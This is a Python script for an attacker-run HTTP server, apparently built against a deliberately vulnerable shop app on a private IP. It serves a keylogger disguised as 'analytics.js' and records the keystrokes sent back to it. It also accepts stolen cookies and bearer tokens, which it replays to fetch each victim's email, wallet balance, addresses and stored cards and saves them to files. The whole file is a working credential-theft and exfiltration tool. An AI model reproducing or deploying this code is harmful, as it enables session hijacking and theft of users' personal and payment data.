import http.server
from http.cookies import SimpleCookie
import socketserver
from urllib.parse import urlparse, parse_qs
import requests
import json

PORT = 4443

SERVER_URL = "http://10.227.147.93:3000/" # server ip
WHOAMI_PATH = "rest/user/whoami"
BALANCE_PATH = "rest/wallet/balance"
ADDRESS_PATH = "api/Addresss"
CARDS_PATH = "api/Cards"

def steal_information(path, cookies, bearer):
    print('Try to fetch... ' + path)
    headers = {"Authorization": f"Bearer {bearer}"}
    response = requests.get(SERVER_URL + path, cookies=cookies, headers=headers)
    return json.loads(response.text)

def parse_cookies(raw):
    cookie = SimpleCookie()
    cookie.load(raw)
    res = {k: v.value for k, v in cookie.items()}
    return res

# ===============================================================
# SERVER
# ===============================================================

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            parsed_url = urlparse(self.path)
            query_params = parse_qs(parsed_url.query)

            if self.path == '/analytics.js':
                self.send_response(200)
                self.send_header('Content-type', 'application/javascript')
                self.end_headers()
                with open('analytics.js', 'r') as file:
                    self.wfile.write(file.read().encode())
                print('Served keylogger for an user...')
                return
            
            # 'a' will identify command for the cookie
            if 'a' in query_params:
                cookies = parse_cookies(query_params['a'][0])
                bearer = query_params['aa'][0]

                if cookies and bearer:
                    data = {
                        'email': steal_information(WHOAMI_PATH, cookies, bearer),
                        'balance': steal_information(BALANCE_PATH, cookies, bearer),
                        'address': steal_information(ADDRESS_PATH, cookies, bearer),
                        'cards': steal_information(CARDS_PATH, cookies, bearer),
                    }

                    with open(f'{data["email"]["user"]["email"]}.json', 'w') as file:
                        file.write(json.dumps(data))

                    print(f'Stole user data - {data["email"]["user"]["email"]}')

            # 'b' will identify command for the keylogger
            elif 'b' in query_params:
                with open(f'{query_params["id"][0]}.txt', 'a') as file:
                    file.write(str(query_params['b'][0]) + '\n')
        except:
            pass

        self.send_response(200)
        self.end_headers()

def main(port):
    with socketserver.TCPServer(("", port), RequestHandler) as httpd:
        print("Server started at port", port)
        httpd.serve_forever()

if __name__ == "__main__":
    main(PORT)
